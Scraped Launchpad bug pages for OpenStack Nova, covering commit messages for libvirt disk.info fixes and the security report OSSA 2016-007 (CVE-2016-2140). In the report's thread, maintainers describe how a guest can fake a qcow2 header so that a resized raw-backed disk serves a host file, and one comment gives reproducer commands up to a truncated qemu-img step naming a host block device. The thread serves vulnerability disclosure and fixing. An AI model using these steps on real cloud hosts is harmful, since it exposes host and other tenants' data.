    file. This adds a check for that case to make sure we don't run

    that path in the non-disk-image backend case.

Closes-Bug: #1555287

Change-Id: I02f8a5f0e29816336e500a8fe8dcc9ece15968e9

Reviewed: https://review.openstack.org/290715
Committed: https://git.openstack.org/cgit/openstack/nova/commit/?id=ccd6195e67c735aa216bea51d9dccfed631dc814
Submitter: Jenkins
Branch: master
commit ccd6195e67c735aa216bea51d9dccfed631dc814
Author: Matthew Booth <mbooth@redhat.com>
Date: Wed Mar 9 17:27:03 2016 +0000
Fix processing of libvirt disk.info in non-disk-image cases
In Idfc16f54049aaeab31ac1c1d8d79a129acc9fb87 a change was made
that caused non-disk-image backends to fall over because of an
undefined variable because they skipped processing of the disk.info
file. This adds a check for that case to make sure we don't run
that path in the non-disk-image backend case.
Closes-Bug: #1555287
Change-Id: I02f8a5f0e29816336e500a8fe8dcc9ece15968e9

| Changed in nova: | |
| --- | --- |
| **status**: | In Progress → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-10:  [**Fix merged to nova (stable/kilo)**](/nova/%2Bbug/1555287/comments/4) |  |  | [#4](/nova/%2Bbug/1555287/comments/4) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/290847>

Committed: <https://git.openstack.org/cgit/openstack/nova/commit/?id=2d7166db25c2d6f5147f4da2c6067895420d5995>

Submitter: Jenkins

Branch: stable/kilo

commit 2d7166db25c2d6f5147f4da2c6067895420d5995

Author: Matthew Booth <email address hidden>

Date: Wed Mar 9 17:27:03 2016 +0000

Fix processing of libvirt disk.info in non-disk-image cases

In Idfc16f54049aaeab31ac1c1d8d79a129acc9fb87 a change was made

    that caused non-disk-image backends to fall over because of an

    undefined variable because they skipped processing of the disk.info

    file. This adds a check for that case to make sure we don't run

    that path in the non-disk-image backend case.

Closes-Bug: #1555287

Change-Id: I02f8a5f0e29816336e500a8fe8dcc9ece15968e9

Reviewed: https://review.openstack.org/290847
Committed: https://git.openstack.org/cgit/openstack/nova/commit/?id=2d7166db25c2d6f5147f4da2c6067895420d5995
Submitter: Jenkins
Branch: stable/kilo
commit 2d7166db25c2d6f5147f4da2c6067895420d5995
Author: Matthew Booth <mbooth@redhat.com>
Date: Wed Mar 9 17:27:03 2016 +0000
Fix processing of libvirt disk.info in non-disk-image cases
In Idfc16f54049aaeab31ac1c1d8d79a129acc9fb87 a change was made
that caused non-disk-image backends to fall over because of an
undefined variable because they skipped processing of the disk.info
file. This adds a check for that case to make sure we don't run
that path in the non-disk-image backend case.
Closes-Bug: #1555287
Change-Id: I02f8a5f0e29816336e500a8fe8dcc9ece15968e9

| **tags**: | added: in-stable-kilo |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-10:  [**Fix merged to nova (stable/liberty)**](/nova/%2Bbug/1555287/comments/5) |  |  | [#5](/nova/%2Bbug/1555287/comments/5) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/290843>

Committed: <https://git.openstack.org/cgit/openstack/nova/commit/?id=e8dc5c876cbade81a0a2991a8c100bc9afc0e42a>

Submitter: Jenkins

Branch: stable/liberty

commit e8dc5c876cbade81a0a2991a8c100bc9afc0e42a

Author: Matthew Booth <email address hidden>

Date: Wed Mar 9 17:27:03 2016 +0000

Fix processing of libvirt disk.info in non-disk-image cases

In Idfc16f54049aaeab31ac1c1d8d79a129acc9fb87 a change was made

    that caused non-disk-image backends to fall over because of an

    undefined variable because they skipped processing of the disk.info

    file. This adds a check for that case to make sure we don't run

    that path in the non-disk-image backend case.

Closes-Bug: #1555287

Change-Id: I02f8a5f0e29816336e500a8fe8dcc9ece15968e9

Reviewed: https://review.openstack.org/290843
Committed: https://git.openstack.org/cgit/openstack/nova/commit/?id=e8dc5c876cbade81a0a2991a8c100bc9afc0e42a
Submitter: Jenkins
Branch: stable/liberty
commit e8dc5c876cbade81a0a2991a8c100bc9afc0e42a
Author: Matthew Booth <mbooth@redhat.com>
Date: Wed Mar 9 17:27:03 2016 +0000
Fix processing of libvirt disk.info in non-disk-image cases
In Idfc16f54049aaeab31ac1c1d8d79a129acc9fb87 a change was made
that caused non-disk-image backends to fall over because of an
undefined variable because they skipped processing of the disk.info
file. This adds a check for that case to make sure we don't run
that path in the non-disk-image backend case.
Closes-Bug: #1555287
Change-Id: I02f8a5f0e29816336e500a8fe8dcc9ece15968e9

| **tags**: | added: in-stable-liberty |
| --- | --- |

[Matt Riedemann (mriedem)](https://launchpad.net/~mriedem)
on 2016-03-10

| Changed in nova: | |
| --- | --- |
| **assignee**: | Dan Smith (danms) → Matthew Booth (mbooth-9) |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Thierry Carrez (ttx)](https://launchpad.net/~ttx) wrote on 2016-03-16:  [**Fix included in openstack/nova 13.0.0.0rc1**](/nova/%2Bbug/1555287/comments/6) |  |  | [#6](/nova/%2Bbug/1555287/comments/6) |
| --- | --- | --- | --- |

This issue was fixed in the openstack/nova 13.0.0.0rc1 release candidate.

This issue was fixed in the openstack/nova 13.0.0.0rc1 release candidate.

[Matt Riedemann (mriedem)](https://launchpad.net/~mriedem)
on 2016-03-21

| **tags**: | removed: mitaka-rc-potential |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Davanum Srinivas (DIMS) (dims-v)](https://launchpad.net/~dims-v) wrote on 2016-04-14:  [**Fix included in openstack/nova 12.0.3**](/nova/%2Bbug/1555287/comments/7) |  |  | [#7](/nova/%2Bbug/1555287/comments/7) |
| --- | --- | --- | --- |

This issue was fixed in the openstack/nova 12.0.3 release.

This issue was fixed in the openstack/nova 12.0.3 release.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Doug Hellmann (doug-hellmann)](https://launchpad.net/~doug-hellmann) wrote on 2016-05-10:  [**Fix included in openstack/nova 2015.1.4**](/nova/%2Bbug/1555287/comments/8) |  |  | [#8](/nova/%2Bbug/1555287/comments/8) |
| --- | --- | --- | --- |

This issue was fixed in the openstack/nova 2015.1.4 release.

This issue was fixed in the openstack/nova 2015.1.4 release.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-11-10: |  |  | [#9](/nova/%2Bbug/1555287/comments/9) |
| --- | --- | --- | --- |

This issue was fixed in the openstack/nova 2015.1.4 release.

This issue was fixed in the openstack/nova 2015.1.4 release.

[See full activity log](https://bugs.launchpad.net/nova/%2Bbug/1555287/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/nova/%2Bfilebug)

This report contains
**Public**
information

Everyone can see this information.

You are
[not directly subscribed to this bug's notifications.](/nova/%2Bbug/1555287/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/nova/%2Bbug/1555287/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/nova/%2Bbug/1555287/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from review.openstack.org_affe75b4_20250126_124913.html ===




=== Content from bugs.launchpad.net_19bc1de3_20250126_124855.html ===

[Log in / Register](https://bugs.launchpad.net/nova/%2Bbug/1558697/%2Blogin)

[![](https://launchpadlibrarian.net/324577028/nova64.png)](https://launchpad.net/nova)

## [OpenStack Compute (nova)](https://launchpad.net/nova)

* [Overview](https://launchpad.net/nova)
* [Code](https://code.launchpad.net/nova)
* [Bugs](https://bugs.launchpad.net/nova)
* [Blueprints](https://blueprints.launchpad.net/nova)
* [Translations](https://translations.launchpad.net/nova)
* [Answers](https://answers.launchpad.net/nova)

# [kilo] libvirt block migrations fail due to disk\_info being an encoded JSON string

Bug #1558697 reported by
[Lee Yarwood](https://launchpad.net/~lyarwood)
on 2016-03-17

[6](/%2Bhelp-bugs/bug-heat.html)

This bug affects 1 person

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [OpenStack Compute (nova)](https://bugs.launchpad.net/nova) | Invalid | Undecided | Unassigned |  |
|  | [Kilo](https://bugs.launchpad.net/nova/kilo) | Fix Released | High | [Matt Riedemann](https://launchpad.net/~mriedem) | [OpenStack Compute (nova) 2015.1.4](https://launchpad.net/nova/%2Bmilestone/2015.1.4) |
|  | [OpenStack Security Advisory](https://bugs.launchpad.net/ossa) | Fix Released | Undecided | Unassigned |  |

### Bug Description

The fix for OSSA 2016-007 / CVE-2016-2140 in f302bf04 assumed that disk\_info is always a plain, decoded list. However prior to Liberty when preforming a live block migration the compute manager populates disk\_info with an encoded JSON string when calling self.driver.get\_instance\_disk\_info. In the live migration case without block migration disk\_info remains a plain decoded list.

More details with an example trace downstream in the following bug :

live migration without shared storage fails in pre\_live\_migration after upgrade to 2015.1.2-18.2

<https://bugzilla.redhat.com/show_bug.cgi?id=1318722>

## CVE References

* [2016-2140](/bugs/cve/2016-2140 "The libvirt driver in OpenStack Compu...")

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-17:  [**Fix proposed to nova (stable/kilo)**](/nova/%2Bbug/1558697/comments/1) |  |  | [#1](/nova/%2Bbug/1558697/comments/1) |
| --- | --- | --- | --- |

Fix proposed to branch: stable/kilo

Review: <https://review.openstack.org/294205>

Fix proposed to branch: stable/kilo
Review: https://review.openstack.org/294205

[Matt Riedemann (mriedem)](https://launchpad.net/~mriedem)
on 2016-03-17

| Changed in nova: | |
| --- | --- |
| **status**: | New → Invalid |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-03-18: |  |  | [#2](/nova/%2Bbug/1558697/comments/2) |
| --- | --- | --- | --- |

Since f302bf04 was referenced in the advisory, we may have to send another ERRATA to include the additional patch. I've added an OSSA task to keep track of that effort.

Since f302bf04 was referenced in the advisory, we may have to send another ERRATA to include the additional patch. I've added an OSSA task to keep track of that effort.

| Changed in ossa: | |
| --- | --- |
| **status**: | New → Incomplete |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-19:  [**Fix merged to nova (stable/kilo)**](/nova/%2Bbug/1558697/comments/3) |  |  | [#3](/nova/%2Bbug/1558697/comments/3) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/294205>

Committed: <https://git.openstack.org/cgit/openstack/nova/commit/?id=a0b86d806ee10bead7da7b0987362d9b6e31889e>

Submitter: Jenkins

Branch: stable/kilo

commit a0b86d806ee10bead7da7b0987362d9b6e31889e

Author: Lee Yarwood <email address hidden>

Date: Thu Mar 17 16:36:08 2016 +0000

libvirt: Decode disk\_info before use

The fix for OSSA 2016-007 / CVE-2016-2140 in f302bf04 assumed that

    disk\_info is always a plain, decoded list. However prior to Liberty

    when preforming a live block migration the compute manager populates

    disk\_info with an encoded JSON string when calling

    self.driver.get\_instance\_disk\_info. In the live migration case without

    block migration disk\_info is None.

As a result we should always decode disk\_info when a block migration

    is called for to ensure that we can iterate over the disks and rebuild

    the disk.info file.

The following change removed the JSON encoding from

    get\_instance\_disk\_info and other methods within the libvirt driver for

    Liberty.

libvirt: Remove unnecessary JSON conversions

    <https://review.openstack.org/#/c/177437/6>

Closes-Bug: #1558697

    Change-Id: Icfe1f23cc3af2d0166dac82109111e341623fc4a

Reviewed: https://review.openstack.org/294205
Committed: https://git.openstack.org/cgit/openstack/nova/commit/?id=a0b86d806ee10bead7da7b0987362d9b6e31889e
Submitter: Jenkins
Branch: stable/kilo
commit a0b86d806ee10bead7da7b0987362d9b6e31889e
Author: Lee Yarwood <lyarwood@redhat.com>
Date: Thu Mar 17 16:36:08 2016 +0000
libvirt: Decode disk\_info before use
The fix for OSSA 2016-007 / CVE-2016-2140 in f302bf04 assumed that
disk\_info is always a plain, decoded list. However prior to Liberty
when preforming a live block migration the compute manager populates
disk\_info with an encoded JSON string when calling
self.driver.get\_instance\_disk\_info. In the live migration case without
block migration disk\_info is None.
As a result we should always decode disk\_info when a block migration
is called for to ensure that we can iterate over the disks and rebuild
the disk.info file.
The following change removed the JSON encoding from
get\_instance\_disk\_info and other methods within the libvirt driver for
Liberty.
libvirt: Remove unnecessary JSON conversions
https://review.openstack.org/#/c/177437/6
Closes-Bug: #1558697
Change-Id: Icfe1f23cc3af2d0166dac82109111e341623fc4a

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2016-03-21

| Changed in ossa: | |
| --- | --- |
| **status**: | Incomplete → Confirmed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-29:  [**Related fix proposed to ossa (master)**](/nova/%2Bbug/1558697/comments/4) |  |  | [#4](/nova/%2Bbug/1558697/comments/4) |
| --- | --- | --- | --- |

Related fix proposed to branch: master

Review: <https://review.openstack.org/298973>

Related fix proposed to branch: master
Review: https://review.openstack.org/298973

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-03-30:  [**Related fix merged to ossa (master)**](/nova/%2Bbug/1558697/comments/5) |  |  | [#5](/nova/%2Bbug/1558697/comments/5) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/298973>

Committed: <https://git.openstack.org/cgit/openstack/ossa/commit/?id=ffcfc1a6fc7acd6c4e718c98ae705a65079f7a4e>

Submitter: Jenkins

Branch: master

commit ffcfc1a6fc7acd6c4e718c98ae705a65079f7a4e

Author: Tristan Cacqueray <email address hidden>

Date: Tue Mar 29 16:39:52 2016 -0400

Updates OSSA 2016-007 with ERRATA#2

Change-Id: Icbf47637ac9d5afa17afb0656d8374b4bf2562fb

    Related-Bug: #1558697

Reviewed: https://review.openstack.org/298973
Committed: https://git.openstack.org/cgit/openstack/ossa/commit/?id=ffcfc1a6fc7acd6c4e718c98ae705a65079f7a4e
Submitter: Jenkins
Branch: master
commit ffcfc1a6fc7acd6c4e718c98ae705a65079f7a4e
Author: Tristan Cacqueray <tdecacqu@redhat.com>
Date: Tue Mar 29 16:39:52 2016 -0400
Updates OSSA 2016-007 with ERRATA#2
Change-Id: Icbf47637ac9d5afa17afb0656d8374b4bf2562fb
Related-Bug: #1558697

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2016-03-30

| Changed in ossa: | |
| --- | --- |
| **status**: | Confirmed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Doug Hellmann (doug-hellmann)](https://launchpad.net/~doug-hellmann) wrote on 2016-05-10:  [**Fix included in openstack/nova 2015.1.4**](/nova/%2Bbug/1558697/comments/6) |  |  | [#6](/nova/%2Bbug/1558697/comments/6) |
| --- | --- | --- | --- |

This issue was fixed in the openstack/nova 2015.1.4 release.

This issue was fixed in the openstack/nova 2015.1.4 release.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2016-11-10: |  |  | [#7](/nova/%2Bbug/1558697/comments/7) |
| --- | --- | --- | --- |

This issue was fixed in the openstack/nova 2015.1.4 release.

This issue was fixed in the openstack/nova 2015.1.4 release.

[See full activity log](https://bugs.launchpad.net/nova/%2Bbug/1558697/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/nova/%2Bfilebug)

This report contains
**Public**
information

Everyone can see this information.

You are
[not directly subscribed to this bug's notifications.](/nova/%2Bbug/1558697/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/nova/%2Bbug/1558697/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/nova/%2Bbug/1558697/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from bugs.launchpad.net_4392bcac_20250125_233246.html ===

[Log in / Register](https://bugs.launchpad.net/nova/%2Bbug/1548450/%2Blogin)

[![](https://launchpadlibrarian.net/324577028/nova64.png)](https://launchpad.net/nova)

## [OpenStack Compute (nova)](https://launchpad.net/nova)

* [Overview](https://launchpad.net/nova)
* [Code](https://code.launchpad.net/nova)
* [Bugs](https://bugs.launchpad.net/nova)
* [Blueprints](https://blueprints.launchpad.net/nova)
* [Translations](https://translations.launchpad.net/nova)
* [Answers](https://answers.launchpad.net/nova)

# [OSSA 2016-007] Host data leak during resize/migrate for raw-backed instances (CVE-2016-2140)

Bug #1548450 reported by
[Matthew Booth](https://launchpad.net/~mbooth-9)
on 2016-02-22

[18](/%2Bhelp-bugs/bug-heat.html)

This bug affects 1 person

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [OpenStack Compute (nova)](https://bugs.launchpad.net/nova) | Fix Released | Critical | [Lee Yarwood](https://launchpad.net/~lyarwood) |  |
|  | [Kilo](https://bugs.launchpad.net/nova/kilo) | Fix Released | Critical | [Lee Yarwood](https://launchpad.net/~lyarwood) | [OpenStack Compute (nova) 2015.1.4](https://launchpad.net/nova/%2Bmilestone/2015.1.4) |
|  | [Liberty](https://bugs.launchpad.net/nova/liberty) | Fix Released | Critical | [Lee Yarwood](https://launchpad.net/~lyarwood) |  |
|  | [OpenStack Security Advisory](https://bugs.launchpad.net/ossa) | Fix Released | Critical | Unassigned |  |

### Bug Description

First, a caveat. This report is from code inspection only. I haven't attempted to replicate it, and I have no immediate plans to. It's possible it doesn't exist due to an interaction which isn't immediately obvious.

When resizing an instance using the libvirt driver, we run LibvirtDriver.migrate\_disk\_and\_power\_off on the source host. If there is no shared storage, data is copied. Specifically, there's a loop in that function which loops over disk info:

for info in disk\_info:

                # assume inst\_base == dirname(info['path'])

                ...

                copy the disk

Note that this doesn't copy disk.info, because it's not a disk. I have actually confirmed this whilst investigating another bug.

The problem with this is that disk.info contains file format information, which means that when the instance starts up again, the format of all its disks are re-inspected. This is the bug. It means that a malicious user can write data to an ephemeral or root disk which fakes a qcow2 header, and on re-inspection it will be detected as qcow2 and data from a user-specified backing file will be served.

I am moderately confident that this is a real bug.

Unlike the previous file format bug I reported, though, this bug would be mitigated by the fact that the user would have to access the disk via libvirt/qemu. Assuming they haven't disabled SELinux (nobody does that, right?) this severely limits the data which can be accessed, possibly to the point that it isn't worth exploiting. I also believe it would only be exploitable on deployments using raw storage, which I believe isn't common.

Given that I don't think it's all that serious in practise, I'm not going to work on this immediately as I don't have the time. If it's still around when I'm less busy I'll pick it up.

See [original description](comments/0)

Tags:

[in-stable-liberty](/nova/%2Bbugs?field.tag=in-stable-liberty)
[in-stable-kilo](/nova/%2Bbugs?field.tag=in-stable-kilo)

## CVE References

* [2016-2140](/bugs/cve/2016-2140 "The libvirt driver in OpenStack Compu...")

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2016-02-22

| **description**: | updated |
| --- | --- |
| Changed in ossa: | |
| **status**: | New → Incomplete |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-02-22: |  |  | [#1](/nova/%2Bbug/1548450/comments/1) |
| --- | --- | --- | --- |

Since this report concerns a possible security risk, an incomplete security advisory task has been added while the core security reviewers for the affected project or projects confirm the bug and discuss the scope of any vulnerability along with potential solutions.

So IIRC, the user needs direct access to libvirt/qemu to overwrite the disk with fake qcow2 headers after the instance is migrated and before the disk is re-inspected ?

Since this report concerns a possible security risk, an incomplete security advisory task has been added while the core security reviewers for the affected project or projects confirm the bug and discuss the scope of any vulnerability along with potential solutions.
So IIRC, the user needs direct access to libvirt/qemu to overwrite the disk with fake qcow2 headers after the instance is migrated and before the disk is re-inspected ?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-02-23: |  |  | [#2](/nova/%2Bbug/1548450/comments/2) |
| --- | --- | --- | --- |

Here's a theoretical reproducer, which \*I HAVE NOT TESTED\*:

A system uses raw files for storage. An unprivileged user creates an instance using a flavour with an ephemeral disk. From within the instance, the user writes a fake qcow2 header to the ephemeral disk with an external backing file. The user resizes the instance. After resize, the user logs in to their instance again. The ephemeral disk now presents the contents of the backing file rather than the fake qcow2 header.

There is a hard requirement here on using the libvirt driver and raw storage. Qcow2 storage isn't vulnerable to this kind of attack, and rbd and lvm both hard code the raw format and don't require inspection. Ploop is just different. I doubt it's vulnerable.

Because the data is accessed from within the instance, it is confined both by unix permissions, and by whatever mechanism confines data accessible by the qemu process. On RHEL OSP this would include SELinux, which I believe would severely limit the impact of this attack.

Here's a theoretical reproducer, which \*I HAVE NOT TESTED\*:
A system uses raw files for storage. An unprivileged user creates an instance using a flavour with an ephemeral disk. From within the instance, the user writes a fake qcow2 header to the ephemeral disk with an external backing file. The user resizes the instance. After resize, the user logs in to their instance again. The ephemeral disk now presents the contents of the backing file rather than the fake qcow2 header.
There is a hard requirement here on using the libvirt driver and raw storage. Qcow2 storage isn't vulnerable to this kind of attack, and rbd and lvm both hard code the raw format and don't require inspection. Ploop is just different. I doubt it's vulnerable.
Because the data is accessed from within the instance, it is confined both by unix permissions, and by whatever mechanism confines data accessible by the qemu process. On RHEL OSP this would include SELinux, which I believe would severely limit the impact of this attack.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Daniel Berrange (berrange)](https://launchpad.net/~berrange) wrote on 2016-02-23: |  |  | [#3](/nova/%2Bbug/1548450/comments/3) |
| --- | --- | --- | --- |

Whether SELinux protects us or not entirely depends on what Nova sets as the disk format in the XML after the resize. If Nova were to tell Libvirt that the disk is qcow2 after the resize, then SELinux will happily grant access to the backing file set in the qcow2 file.

Whether SELinux protects us or not entirely depends on what Nova sets as the disk format in the XML after the resize. If Nova were to tell Libvirt that the disk is qcow2 after the resize, then SELinux will happily grant access to the backing file set in the qcow2 file.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-02-23: |  |  | [#4](/nova/%2Bbug/1548450/comments/4) |
| --- | --- | --- | --- |

Ah, that would be more serious, then. I can confirm that nova explicitly tells libvirt that the file is qcows.

Ah, that would be more serious, then. I can confirm that nova explicitly tells libvirt that the file is qcows.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-02-23: |  |  | [#5](/nova/%2Bbug/1548450/comments/5) |
| --- | --- | --- | --- |

To clarify that last: I can confirm that nova would tell libvirt that the file is qcow2 if my understanding of the bug is correct. I still haven't reproduced it.

To clarify that last: I can confirm that nova would tell libvirt that the file is qcow2 if my understanding of the bug is correct. I still haven't reproduced it.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-02-23: |  |  | [#6](/nova/%2Bbug/1548450/comments/6) |
| --- | --- | --- | --- |

If this is exploitable, it would be interesting to know if libvirt will allow use of a host block device as a backing file. That would be extremely serious.

If this is exploitable, it would be interesting to know if libvirt will allow use of a host block device as a backing file. That would be extremely serious.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-02-23: |  |  | [#7](/nova/%2Bbug/1548450/comments/7) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/nova/%2Bbug/1548450/comments/7/%2Bdownload) (6.7 KiB)

I've been able to reproduce this using a compute host block device as the backing file on RHEL OSP 8 (Liberty). I plan on repeating this with devstack for Mitaka shortly. My notes on this reproducer are below :

- Image and flavor configuration :

# wget <https://download.fedoraproject.org/pub/fedora/linux/releases/23/Cloud/x86_64/Images/Fedora-Cloud-Base-23-20151030.x86_64.qcow2>

# glance image-create --name fedora --file Fedora-Cloud-Base-23-20151030.x86\_64.qcow2 --disk-format qcow2 --container-format bare --progress

# nova flavor-create eph 6 512 5 1 --ephemeral 1

# nova flavor-create eph\_large 7 768 5 1 --ephemeral 1

- Ensure use\_cow\_images is False on all compute hosts :

# openstack-config --get /etc/nova/nova.conf libvirt use\_cow\_images

False

- Boot an instance using the fedora image and a small ephemeral disk :

# nova boot --key-name local --image fedora --ephemeral size=1,format=ext4 --flavor 6 --nic net-id=b41000f6-9de2-4851-a622-2a5786167e83 test-boot

root@host # ps aux | grep qemu

qemu 18725 93.7 9.4 1421432 751232 ? Rl 14:00 6:47 /usr/libexec/qemu-kvm -name instance-00000005 -S -machine pc-i440fx-rhel7.2.0,accel=tcg,usb=off -m 512 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -uuid d56b9bf3-f3b0-4d76-952b-5015b43babcd -smbios type=1,manufacturer=Red Hat,product=OpenStack Compute,version=12.0.1-6.el7ost,serial=c512dcd1-48bb-644c-9794-82f056d85a95,uuid=d56b9bf3-f3b0-4d76-952b-5015b43babcd,family=Virtual Machine -no-user-config -nodefaults -chardev socket,id=charmonitor,path=/var/lib/libvirt/qemu/domain-instance-00000005/monitor.sock,server,nowait -mon chardev=charmonitor,id=monitor,mode=control -rtc base=utc -no-shutdown -boot strict=on -device piix3-usb-uhci,id=usb,bus=pci.0,addr=0x1.0x2 -drive file=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk,if=none,id=drive-virtio-disk0,format=raw,cache=none -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x4,drive=drive-virtio-disk0,id=virtio-disk0,bootindex=1 -drive file=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk.eph0,if=none,id=drive-virtio-disk1,format=raw,cache=none -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x5,drive=drive-virtio-disk1,id=virtio-disk1 -netdev tap,fd=26,id=hostnet0 -device virtio-net-pci,netdev=hostnet0,id=net0,mac=fa:16:3e:32:1c:23,bus=pci.0,addr=0x3 -chardev file,id=charserial0,path=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/console.log -device isa-serial,chardev=charserial0,id=serial0 -chardev pty,id=charserial1 -device isa-serial,chardev=charserial1,id=serial1 -device usb-tablet,id=input0 -vnc 0.0.0.0:0 -k en-us -device cirrus-vga,id=video0,bus=pci.0,addr=0x2 -device virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x6 -msg timestamp=on

- Confirm the block layout within the guest and umount the formatted ephemeral disk :

root@guest # lsblk

NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT

vda 252:0 0 5G 0 disk

└─vda1 252:1 0 5G 0 part /

vdb 252:16 0 1G 0 disk /mnt

root@guest # umount /mnt

- Use qemu-img to write a qcow2 header to the device using a physical device on the host as a backing file :

root@guest # qemu-img create -f qcow2 -o backing\_file=/dev/sda3,backi...

[Read more...](/nova/%2Bbug/1548450/comments/7)

I've been able to reproduce this using a compute host block device as the backing file on RHEL OSP 8 (Liberty). I plan on repeating this with devstack for Mitaka shortly. My notes on this reproducer are below :
- Image and flavor configuration :
# wget https://download.fedoraproject.org/pub/fedora/linux/releases/23/Cloud/x86\_64/Images/Fedora-Cloud-Base-23-20151030.x86\_64.qcow2
# glance image-create --name fedora --file Fedora-Cloud-Base-23-20151030.x86\_64.qcow2 --disk-format qcow2 --container-format bare --progress
# nova flavor-create eph 6 512 5 1 --ephemeral 1
# nova flavor-create eph\_large 7 768 5 1 --ephemeral 1
- Ensure use\_cow\_images is False on all compute hosts :
# openstack-config --get /etc/nova/nova.conf libvirt use\_cow\_images
False
- Boot an instance using the fedora image and a small ephemeral disk :
